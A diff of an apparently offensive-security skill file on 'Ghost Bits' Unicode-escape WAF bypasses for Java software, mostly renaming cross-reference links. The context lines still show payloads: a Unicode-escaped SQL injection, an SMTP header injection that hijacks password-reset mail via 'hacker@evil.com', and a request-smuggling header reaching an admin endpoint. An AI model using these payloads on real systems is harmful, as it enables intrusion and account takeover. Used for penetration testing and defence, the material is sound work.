@@ -32,20 +32,20 @@ description: >-
 Ghost Bits is a *bypass* primitive that re-enables payloads from many other
 playbooks. Pair it with whichever attack family applies:
 
-- [waf-bypass-techniques](../waf-bypass-techniques/SKILL.md) — when a Java
+- [waf-bypass-techniques](../hack-waf-bypass-techniques/SKILL.md) — when a Java
   backend is suspected and WAF rules block the literal payload, this is the
   first technique to try beyond classic encoding.
-- [deserialization-insecure](../deserialization-insecure/SKILL.md) — for
+- [deserialization-insecure](../hack-deserialization-insecure/SKILL.md) — for
   Apache Commons BCEL ClassLoader and Fastjson `\u`/`\x` escape variants.
-- [path-traversal-lfi](../path-traversal-lfi/SKILL.md) — Spring, Jetty,
+- [path-traversal-lfi](../hack-path-traversal-lfi/SKILL.md) — Spring, Jetty,
   Undertow, Vert.x URL decoding and `%2>` hex folding.
-- [upload-insecure-files](../upload-insecure-files/SKILL.md) — Tomcat
+- upload-insecure-files — Tomcat
   `RFC2231Utility` `filename*` Webshell upload.
-- [request-smuggling](../request-smuggling/SKILL.md) — Apache HttpClient
+- [request-smuggling](../hack-request-smuggling/SKILL.md) — Apache HttpClient
   `<= 4.5.9` (HTTPCLIENT-1974/1978) header CRLF.
-- [crlf-injection](../crlf-injection/SKILL.md) — Angus Mail / Jakarta Mail
+- [crlf-injection](../hack-crlf-injection/SKILL.md) — Angus Mail / Jakarta Mail
   SMTP injection and JDK HttpServer response splitting.
-- [sqli-sql-injection](../sqli-sql-injection/SKILL.md) — Jackson `charToHex`
+- [sqli-sql-injection](../hack-sqli-sql-injection/SKILL.md) — Jackson `charToHex`
   table-lookup truncation hides SQL keywords inside Unicode escapes.
 
 ### Advanced Reference
@@ -363,7 +363,7 @@ Payload (smuggle the digit `1` for a UNION column count):
 | WAF     | `\u丰丰耳失 union select ...` (no leading digit)    |
 | Jackson | `\u0031 union select 1,2,3-- ` -> `1 union select…` |
 
-Pair with [sqli-sql-injection](../sqli-sql-injection/SKILL.md) for the
+Pair with [sqli-sql-injection](../hack-sqli-sql-injection/SKILL.md) for the
 downstream UNION / boolean / time-based payload templates.
 
 ### 5.4 Fastjson — `\u` and `\x` escape bypass (Families B + C)
@@ -456,7 +456,7 @@ hacker@evil.com瘍瘊Subject: Password reset code瘍瘊To: target@victim.com瘍�
 
 Real impact pattern: Jira-style (CVE-2025-57733) password-reset hijacking,
 Confluence domain allowlist bypass — pair with
-[crlf-injection](../crlf-injection/SKILL.md) for non-mail CRLF reuse.
+[crlf-injection](../hack-crlf-injection/SKILL.md) for non-mail CRLF reuse.
 
 ### 5.7 Apache HttpClient `<= 4.5.9` — request smuggling (Family A)
 
@@ -473,7 +473,7 @@ X-Auth-Token: 1瘍瘊POST /admin HTTP/1.1\r\nHost: internal\r\nContent-Length: 0
 | Front proxy / WAF | one request with a long `X-Auth-Token` |
 | Origin            | two requests; the second is an admin POST |
 
-Cross-reference [request-smuggling](../request-smuggling/SKILL.md) for
+Cross-reference [request-smuggling](../hack-request-smuggling/SKILL.md) for
 chosen-prefix attacks once the desync is confirmed.
 
 ### 5.8 JDK HttpServer — response splitting (CVE-2026-21933, Family A)
